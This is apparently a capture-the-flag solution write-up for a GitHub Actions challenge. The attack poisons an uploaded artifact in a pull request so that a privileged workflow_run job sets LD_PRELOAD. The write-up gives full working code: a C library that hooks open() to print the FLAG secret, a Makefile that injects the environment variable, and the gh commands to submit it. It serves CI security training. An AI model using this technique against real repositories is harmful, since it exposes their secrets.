# Level 2 - Unsafe artifact download in workflow_run

## Description

The whole `outputs` folder is uploaded in artifacts and is then downloaded in a subsidiary `worklow_run` containing the flag.
The attacker can modify the `build.sh` script through a PR to abuse the fact that the `pr.txt` file content is set as environment variable, thus making it possible to do the `LD_PRELOAD` trick.

## Solution

1. Fork the repo

```bash
gh repo fork --clone --default-branch-only '<ORG>/level-2'
```

2. Create the `LD_PRELOAD` backdoor in a new `backdoor.c` file:

```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/types.h>

int open(const char *pathname, int flags, ...) {
    static int (*real_open)(const char *, int, ...) = NULL;

    if (!real_open) {
        real_open = dlsym(RTLD_NEXT, "open");
    }

	// Get the FLAG env variable
    const char *flag = getenv("FLAG");
    if (flag) {
        fprintf(stderr, "[LD_PRELOAD LEAK] FLAG = %s\n", flag);
    } else {
        fprintf(stderr, "[LD_PRELOAD LEAK] FLAG is not set\n");
    }

    // Handle optional third argument (mode) when O_CREAT is set
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode_t mode = va_arg(args, mode_t);
        va_end(args);
        return real_open(pathname, flags, mode);
    }

    return real_open(pathname, flags);
}
```

dddd

3. Create a new branch and modify the `Makefile`:

```Makefile
# Compiler and flags
CC = gcc
CFLAGS = -Wall -Wextra -O2
PICFLAGS = -fPIC -shared
LDFLAGS = -ldl

# Targets
TARGET = prog
SO_TARGET = outputs/backdoor.so
PR_FILE = outputs/pr.txt

# Default rule
all: $(TARGET) $(SO_TARGET) $(PR_FILE)

# Rule to build the binary
$(TARGET): main.c
	$(CC) $(CFLAGS) -o $@ main.c

# Rule to build shared object from backdoor.c
$(SO_TARGET): backdoor.c | outputs
	$(CC) $(PICFLAGS) -o $@ backdoor.c $(LDFLAGS)

# Rule to overwrite pr.txt with LD_PRELOAD env variable
$(PR_FILE): | outputs
	echo -e "1\nLD_PRELOAD=./backdoor.so" > $@

# Clean everything
clean:
	rm -f $(TARGET)
	rm -rf outputs
```

4. Create a PR with the new branch:

```bash
gh pr create --draft -t 'Backdoor' -b 'foo'
```
